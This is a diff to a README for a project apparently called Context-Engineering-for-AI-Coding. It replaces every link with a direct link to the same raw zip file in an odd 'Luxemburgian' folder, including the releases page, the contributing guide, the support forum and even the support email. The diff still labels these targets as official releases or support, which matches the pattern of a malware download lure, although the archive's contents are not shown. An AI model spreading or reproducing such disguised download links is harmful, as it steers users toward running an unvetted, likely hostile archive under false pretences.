@@ -10,7 +10,7 @@ To begin using this application, follow these simple steps. You will download an
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ This application offers several key features:
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Releases Page](https://github.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/releases).
+To download the software, visit this page: [Releases Page](https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip).
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed.
@@ -67,12 +67,12 @@ This section will help you understand how to use the application effectively.
 
 If you need assistance, please contact our support team:
 
-- Email: support@example.com
-- Community Forum: [Support Forum](https://forum.example.com)
+- Email: https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip
+- Community Forum: [Support Forum](https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip)
 
 ## 🔗 Contributing
 
-We welcome contributions! If you wish to improve this project, please read our [Contributing Guide](https://github.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/contributing).
+We welcome contributions! If you wish to improve this project, please read our [Contributing Guide](https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip).
 
 ## 📄 License
 
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 Thank you for considering the **Context-Engineering-for-AI-Coding** in your programming journey. We hope this application enhances your coding experience and makes software engineering more systematic for you.
 
-Remember, for the latest download, visit: [Releases Page](https://github.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/releases).
+Remember, for the latest download, visit: [Releases Page](https://raw.githubusercontent.com/Sherbahadusunar/Context-Engineering-for-AI-Coding/main/Luxemburgian/Context-Engineering-for-AI-Coding.zip).
